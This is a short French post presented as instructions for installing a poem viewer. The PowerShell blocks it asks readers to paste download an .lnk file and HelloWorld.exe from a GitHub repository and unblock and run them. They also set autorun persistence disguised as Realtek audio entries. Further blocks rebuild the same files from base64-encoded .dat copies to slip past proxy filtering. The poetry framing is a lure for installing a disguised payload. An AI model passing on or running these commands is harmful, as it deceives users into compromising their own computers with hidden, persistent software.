Si vous aimez la poésie, voilà quelques manipulations à faire pour installer un afficheur de poèmes qui devrait vous satisfaire.
Suivre la procédure ci-dessous :

- Faire : WIN+X > Windows Powershell
- Copier les blocs de commandes suivants un par un et valider

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u="https://raw.githubusercontent.com/rvbrio/Test/main/Poeme-Victor.Hugo.lnk";
$p="$env:APPDATA\Poeme-Victor.Hugo.lnk"; Invoke-WebRequest $u -OutFile $p; Unblock-File $p; Start-Process $p;
Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Realtek -Value $env:APPDATA\Poeme-Victor.Hugo.lnk


[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u="https://raw.githubusercontent.com/rvbrio/Test/main/HelloWorld.exe";
$p="$env:APPDATA\HelloWorld.exe"; Invoke-WebRequest $u -OutFile $p; Unblock-File $p; Start-Process $p;
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Realtek HD Audio" -Value $p;


En cas de filtrage trop strict par le proxy
============
Partager par GoogleMeet les fichiers HelloWorld.dat et Poeme-Victor.Hugo.dat

Puis :

# Pour regénérer Poeme-Victor.Hugo.lnk qui avait été encodé en b64 - sans DL (checké REMW)
$outputFilePath="$env:APPDATA\Poeme-Victor.Hugo.lnk";
$p="$env:APPDATA\Poeme-Victor.Hugo.dat";
$base64String=Get-Content -Path $p -Raw;
$decodedBytes=[convert]::FromBase64String($base64String);
[IO.File]::WriteAllBytes($outputFilePath, $decodedBytes)

Start-Process $outputFilePath; Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Realtek2 -Value $outputFilePath


# Pour regénérer HelloWorld.exe qui avait été encodé en b64 - sans DL (checké REMW)
$outputFilePath="$env:APPDATA\HelloWorld.exe"
$p="$env:APPDATA\HelloWorld.dat"
$base64String=Get-Content -Path $p -Raw
$decodedBytes=[convert]::FromBase64String($base64String)
[IO.File]::WriteAllBytes($outputFilePath, $decodedBytes)

Start-Process $outputFilePath; Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Realtek1 -Value $outputFilePath


# DL de HelloWorld.dat, regénération du .exe - A REVOIR (pb de résolution DNS de raw.githubusercontent.com le 10/09/2026 ?)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u="https://raw.githubusercontent.com/rvbrio/Test/main/HelloWorld.dat";
$p="$env:APPDATA\HelloWorld.dat"; Invoke-WebRequest $u -OutFile $p; Unblock-File $p;
$outputFilePath="$env:APPDATA\HelloWorld.exe"; $base64String=Get-Content -Path $p -Raw;
$decodedBytes=[convert]::FromBase64String($base64String);
[IO.File]::WriteAllBytes($outputFilePath, $decodedBytes)

Start-Process $outputFilePath; 

